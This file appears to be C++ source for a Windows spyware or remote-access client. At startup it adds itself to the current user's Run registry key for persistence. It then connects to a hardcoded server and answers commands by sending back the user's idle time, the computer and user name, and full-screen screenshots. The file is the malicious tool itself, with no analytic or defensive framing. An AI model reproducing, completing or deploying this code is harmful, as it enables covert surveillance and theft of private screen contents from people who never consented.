#define WIN32_LEAND_AND_MEAN
#define _WINSOCKAPI_
#include <iostream>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>

#pragma comment (lib, "Ws2_32.lib")

#define DEFAULT_IP "127.0.0.1"
#define DEFAULT_PORT "4747"

int DisconnectFromServer(SOCKET);

DWORD RecvCmd(SOCKET Serv)
{
    DWORD dwSzBuffer = sizeof(DWORD);
    LPSTR lpBuffer = new char[dwSzBuffer];
    ZeroMemory(lpBuffer, dwSzBuffer);
    int dwRecvBytes = recv(Serv, lpBuffer, dwSzBuffer, NULL);
    std::string Msg = lpBuffer;
    delete[] lpBuffer;
    if (dwRecvBytes == 0)
    {
        return 0;
    }
    if (dwRecvBytes < 0)
    {
        return 0;
    }
    return stoi(Msg);
}

int SendBytes(SOCKET Serv, LPSTR lpData, DWORD dwBytesCount)
{
    return send(Serv, lpData, dwBytesCount, NULL);
}

DWORD GetUserInfo(LPSTR lpBuffer)
{
    LPSTR lpComputerName = new char[256];
    LPSTR lpUserName = new char[256];
    DWORD dwSzComputerName = 256;
    DWORD dwSzUserName = 256;
    GetComputerNameA(lpComputerName, &dwSzComputerName);
    GetUserNameA(lpUserName, &dwSzUserName);
    DWORD dwBytesWritten = dwSzComputerName + dwSzUserName + 1;
    sprintf_s(lpBuffer, dwBytesWritten, "%s\\%s", lpComputerName, lpUserName);
    return dwBytesWritten;
}

// Return seconds past from last keyboard/mouse input
DWORD GetLastActiveTime(LPSTR lpBuffer)
{
    LASTINPUTINFO lastInput;
    lastInput.cbSize = sizeof(lastInput);
    lastInput.dwTime = 0;
    GetLastInputInfo(&lastInput);
    DWORD inactiveFor = (DWORD)(GetTickCount64() - lastInput.dwTime)/1000;
    DWORD dwBytesWritten = sizeof(DWORD) + 1; // Line end
    sprintf_s(lpBuffer, dwBytesWritten, "%d", inactiveFor);
    return dwBytesWritten;
}

DWORD GetScreenshot(LPSTR lpBuffer)
{
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);

    HWND hActiveWindow = GetActiveWindow();
    HMONITOR hMonitor = MonitorFromWindow(hActiveWindow, MONITOR_DEFAULTTONEAREST);
    MONITORINFOEX monitorInfoEx;
    monitorInfoEx.cbSize = sizeof(MONITORINFOEX);
    GetMonitorInfo(hMonitor, &monitorInfoEx);

    DEVMODE devMode;
    devMode.dmSize = sizeof(devMode);
    devMode.dmDriverExtra = 0;
    EnumDisplaySettings(monitorInfoEx.szDevice, ENUM_CURRENT_SETTINGS, &devMode);
    //  Scaled screen resolution
    //  GetDeviceCaps(hdcScreen, HORZRES)
    //  GetDeviceCaps(hdcScreen, VERTRES);
    WORD iScreenWidth = devMode.dmPelsWidth; 
    WORD iScreenHeight = devMode.dmPelsHeight; 

    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, iScreenWidth, iScreenHeight);
    SelectObject(hdcMemDC, hbmScreen);
    BitBlt(hdcMemDC, 0, 0, iScreenWidth, iScreenHeight, hdcScreen, 0, 0, SRCCOPY);
    BITMAP bmpScreen;
    GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    // bfType must always be BM for Bitmaps.
    bmfHeader.bfType = 0x4D42; // BM

    DWORD dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;
    DWORD dwOffset = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    DWORD dwSzDIB = dwBmpSize + (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);

    // Offset to where the actual bitmap bits start.
    bmfHeader.bfOffBits = dwOffset;
    bmfHeader.bfSize = dwSzDIB;

    LPSTR dwBiPos = lpBuffer + (DWORD)sizeof(BITMAPFILEHEADER);
    LPSTR dwBMPos = lpBuffer + dwOffset;
    memcpy(lpBuffer, &bmfHeader, (DWORD)sizeof(BITMAPFILEHEADER));
    memcpy(dwBiPos, &bi, (DWORD)sizeof(BITMAPINFOHEADER));

    GetDIBits(hdcScreen, hbmScreen, 0,
        (UINT)bmpScreen.bmHeight,
        dwBMPos,
        (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    DeleteObject(hbmScreen);
    DeleteObject(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
    return dwSzDIB;
}

SOCKET ConnectToServer(LPCSTR IP, LPCSTR PORT)
{
    WSADATA wsaData;
    WORD wsaVersion = MAKEWORD(2, 2);

    if (WSAStartup(wsaVersion, &wsaData) != 0)
    {
        printf("WSAStartup() failed");
        return 1;
    }

    addrinfo* pRes = NULL;
    addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(IP, PORT, &hints, &pRes) != 0) {
        printf("getaddrinfo() failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;
    ConnectSocket = socket(pRes->ai_family, pRes->ai_socktype, pRes->ai_protocol);
    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("socket() failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    if (connect(ConnectSocket, pRes->ai_addr, pRes->ai_addrlen) == SOCKET_ERROR)
    {
        printf("connect() failed: %d\n", WSAGetLastError());
        freeaddrinfo(pRes);
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    freeaddrinfo(pRes);

    return ConnectSocket;
}

int DisconnectFromServer(SOCKET serv)
{
    shutdown(serv, SD_BOTH);
    closesocket(serv);
    WSACleanup();
    return 0;
}
void goAutoRun(std::string path)
{
    LPCSTR progPath = path.c_str();

    HKEY hkey;
    int status = RegOpenKeyEx( HKEY_CURRENT_USER,
                    TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 
                    0, 
                    KEY_ALL_ACCESS,
                    &hkey);

    status = RegSetValueEx(  hkey, 
                    "Client", 
                    0, 
                    REG_SZ,
                    (BYTE*)progPath, 
                    strlen(progPath));
    RegCloseKey(hkey);
}

int main(int argc, char** argv)
{   
    goAutoRun(argv[0]);
    // ~35MB for 4K Screen
    // ~16MB for 2K Screen
    // ~10MB for FHD Screen - default
    DWORD dwSzBuffer = 10'000'000; 
    DWORD dwBytesWritten = 0;
    HANDLE hDIB = GlobalAlloc(GHND, dwSzBuffer);
    LPSTR lpBuffer = (char*)GlobalLock(hDIB);
    ZeroMemory(lpBuffer, dwSzBuffer);
    
    SOCKET serv = ConnectToServer("127.0.0.1", "4747");
    while (true)
    {
        switch (RecvCmd(serv))
        {
        case 0:
            DisconnectFromServer(serv);
            return 0;
            break;

        case 1:
            dwBytesWritten = GetLastActiveTime(lpBuffer);
            SendBytes(serv, lpBuffer, dwBytesWritten);
            break;

        case 2:
            dwBytesWritten = GetUserInfo(lpBuffer);
            SendBytes(serv, lpBuffer, dwBytesWritten);
            break;

        case 3:
            dwBytesWritten = GetScreenshot(lpBuffer);
            SendBytes(serv, lpBuffer, dwBytesWritten);
            break;
        }
    }
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
    return 0;
}